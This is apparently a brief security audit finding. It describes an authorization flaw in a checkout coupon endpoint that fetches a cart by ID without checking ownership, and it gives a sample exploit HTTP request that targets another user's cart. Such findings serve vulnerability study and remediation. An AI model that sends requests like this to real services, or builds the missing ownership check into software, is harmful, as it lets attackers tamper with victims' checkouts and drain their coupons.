diagnosis: The endpoint uses slowapi to rate limit coupon application attempts per IP address to prevent brute-forcing coupon codes. However, it retrieves the cart solely by payload.cart_id without verifying cart.user_id == user.id. An attacker can apply or deplete one-time discount coupons on victims' carts or tamper with active checkouts.
exploit_request:
POST /checkout/coupons/apply HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"cart_id": 8812, "coupon_code": "SUMMER50"}
